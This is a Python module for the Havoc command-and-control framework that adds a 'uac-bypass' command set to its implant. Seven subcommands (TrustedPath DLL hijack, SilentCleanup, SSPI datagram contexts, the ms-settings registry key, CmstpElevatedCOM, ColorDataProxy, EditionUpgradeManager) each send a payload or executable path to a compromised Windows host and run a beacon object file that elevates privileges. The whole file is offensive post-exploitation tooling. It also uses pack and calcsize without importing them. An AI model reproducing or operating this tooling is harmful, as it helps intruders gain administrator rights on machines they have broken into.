from havoc import Demon, RegisterCommand, RegisterModule

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

    def addshort(self, n):
        fmt = '<h'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def run_trustedpath( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False
    
    f = open(params[0], "rb")
    fileBytes = f.read()
    f.close()
    packer.adduint32(len(fileBytes))
    packer.addstr(fileBytes)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing TrustedPath UAC bypass with {params[0]}")
    demon.InlineExecute(TaskID, "go", "TrustedPathDLLHijack/bin/TrustedPathDLLHijackBOF.o", packer.getbuffer(), False )

    return TaskID

def run_sspi( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing SSPI Datagram Contexts UAC bypass with {params[0]}")
    demon.InlineExecute(TaskID, "go", "SspiUacBypass/bin/SspiUacBypassBOF.o", packer.getbuffer(), False )

    return TaskID

def run_registryCommand( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing UAC bypass via modifying the \"ms-settings\\Shell\\Open\\command\" registry key with {params[0]}")
    demon.InlineExecute(TaskID, "go", "RegistryShellCommand/bin/RegistryShellCommandBOF.o", packer.getbuffer(), False )

    return TaskID

def run_SilentCleanupWinDir( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False
    
    f = open(params[0], "rb")
    fileBytes = f.read()
    f.close()
    packer.adduint32(len(fileBytes))
    packer.addstr(fileBytes)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing SilentCleanupWinDir UAC bypass with {params[0]}")
    demon.InlineExecute(TaskID, "go", "SilentCleanupWinDir/bin/SilentCleanupWinDirBOF.o", packer.getbuffer(), False )

    return TaskID

def run_CmstpElevatedCOM( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing UAC bypass via CmstpElevatedCOM with {params[0]}")
    demon.InlineExecute(TaskID, "go", "CmstpElevatedCOM/bin/CmstpElevatedCOMBOF.o", packer.getbuffer(), False )

    return TaskID

def run_ColorDataProxy( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing UAC bypass via ColorDataProxy with {params[0]}")
    demon.InlineExecute(TaskID, "go", "ColorDataProxy/bin/ColorDataProxyBOF.o", packer.getbuffer(), False )

    return TaskID

def run_EditionUpgradeManager( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False
    
    f = open(params[0], "rb")
    fileBytes = f.read()
    f.close()
    packer.adduint32(len(fileBytes))
    packer.addstr(fileBytes)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Performing EditionUpgradeManager UAC bypass with {params[0]}")
    demon.InlineExecute(TaskID, "go", "EditionUpgradeManager/bin/EditionUpgradeManagerBOF.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "uac-bypass", "Havoc UAC Bypass Module", "", "[subcommand] (args)", "", ""  )
RegisterCommand( run_trustedpath, "uac-bypass", "trustedpath", "Perform UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll", 0, "local_dll", "/root/test.dll")
RegisterCommand( run_SilentCleanupWinDir, "uac-bypass", "silentcleanup", "Perform UAC bypass via the \"Environment\\windir\" registry key and SilentCleanup scheduled task", 0, "local_exe", "/root/test.exe")
RegisterCommand( run_sspi, "uac-bypass", "sspidatagram", "Perform UAC bypass via SSPI Datagram Contexts", 0, "file_to_execute", "C:\\Users\\randy\\Desktop\\test.exe")
RegisterCommand( run_registryCommand, "uac-bypass", "registrycommand", "Perform UAC bypass via modifying the \"ms-settings\\Shell\\Open\\command\" registry key", 0, "file_to_execute", "C:\\Users\\randy\\Desktop\\test.exe")
RegisterCommand( run_CmstpElevatedCOM, "uac-bypass", "elevatedcom", "Perform UAC bypass via the ICMLuaUtil elevated COM interface", 0, "file_to_execute", "C:\\Users\\randy\\Desktop\\test.exe")
RegisterCommand( run_ColorDataProxy, "uac-bypass", "colordataproxy", "Perform UAC bypass via ColorDataProxy and elevated ICMLuaUtil COM interface", 0, "file_to_execute", "C:\\Users\\randy\\Desktop\\test.exe")
RegisterCommand( run_EditionUpgradeManager, "uac-bypass", "editionupgrade", "Perform UAC bypass via the \"Environment\\windir\" registry key and elevated IEditionUpgradeManager COM interface", 0, "local_exe", "/root/test.exe")
